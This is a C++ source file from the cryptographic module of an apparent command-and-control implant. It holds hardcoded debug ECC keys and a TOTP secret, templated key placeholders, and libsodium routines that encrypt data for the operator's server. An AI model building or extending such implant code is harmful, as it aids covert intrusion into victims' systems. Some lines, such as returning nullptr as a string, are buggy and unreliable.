#include "CryptoUtils.h"

namespace crypto {
#ifdef DEBUG
    string eccServerPublicKey = "zKn2nDnphmQImAjQ+UmueLUdACvWBb02Voet943Huhc";
    // ECCPublicKey - The implant's ECC public key
    string eccPublicKey = "+UpkonzIDtgnuWkC8HXZkfb6xiXvgKWvbCA4Ii9kRjw";
    // eccPrivateKey - The implant's ECC private key
    string eccPrivateKey = "s+JQAl9lb2+Puj9B3k6PSaDMtbacUb0P5QZTGXhaTog";
    string totpsecret = "TZLMFPN6HDMZGIVSDSP7UNQNG3BNCO3Y";
#else
    string eccServerPublicKey = "{{.Config.ECCServerPublicKey}}";
    // ECCPublicKey - The implant's ECC public key
    string eccPublicKey = "{{.Config.ECCPublicKey}}";
    // eccPrivateKey - The implant's ECC private key
    string eccPrivateKey = "{{.Config.ECCPrivateKey}}";
    string totpsecret = "{{.OTPSecret}}";
#endif
	string RandomKey() {
		unsigned char buf[64];
		randombytes_buf(buf, 64);
		unsigned char out[crypto_hash_sha256_BYTES];
		crypto_hash_sha256(out, buf, 64);
		return string((char*)&out[0], crypto_hash_sha256_BYTES);
	}

    string GetServerECCPublicKey() {
        unsigned char out[crypto_box_PUBLICKEYBYTES];
        size_t lenRet;
        const char* b64end;
        if (sodium_base642bin(out, 32, eccServerPublicKey.c_str(), eccServerPublicKey.size(), NULL, &lenRet, &b64end, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
            return string((char*)&out[0], crypto_box_PUBLICKEYBYTES);
        }
        else {
            return nullptr;
        }
    }


    shared_ptr<ECCKeyPair> getKeyPair() {
        unsigned char out[crypto_box_SECRETKEYBYTES];
        auto keyPair = make_shared<ECCKeyPair>();
        size_t lenRet;
        if (sodium_base642bin(out, crypto_box_PUBLICKEYBYTES, eccPublicKey.c_str(), eccPublicKey.size(), NULL, &lenRet, NULL, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
            memcpy(keyPair->pb_key, out, crypto_box_PUBLICKEYBYTES);
        }
        else {
            return nullptr;
        }
        if (sodium_base642bin(out, crypto_box_SECRETKEYBYTES, eccPrivateKey.c_str(), eccPrivateKey.size(), NULL, &lenRet, NULL, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
            memcpy(keyPair->pv_key, out, crypto_box_SECRETKEYBYTES);
        }
        else {
            return nullptr;
        }
        return keyPair;
    }

    string ECCEncryptToServer(string&& in) {
        auto plaintext = std::move(in);
        auto keyPair = getKeyPair();
        auto server_pbk = crypto::GetServerECCPublicKey();
        unsigned char nonce[crypto_box_NONCEBYTES];
        randombytes_buf(nonce, crypto_box_NONCEBYTES);
        string bytes;
        bytes.resize(crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + plaintext.size());
        
       auto out = bytes.c_str();
        crypto_hash_sha256((unsigned char*)out,keyPair->pb_key, crypto_box_PUBLICKEYBYTES);
        memcpy((void*)&out[crypto_hash_sha256_BYTES], nonce, crypto_box_NONCEBYTES);
        if (!crypto_box_easy((unsigned char*)&out[crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES],
            (unsigned char*)(plaintext.c_str()), plaintext.size(),
            nonce, (const unsigned char*)(server_pbk.c_str()), keyPair->pv_key)) {
            printf("success\n");
            plaintext.clear();
            return bytes;
        }
        else {
            plaintext.clear();
            return string("");
        }
    }

   uint32_t GetTOTP(const chrono::system_clock::time_point& tp) {
        auto vec = Botan::base32_decode(totpsecret);
        auto totp_key = vec.data();
        auto a = Botan::TOTP(totp_key, vec.size(), "SHA-256", 8, 30);
        auto totp = a.generate_totp(tp);

        return totp;
    }
}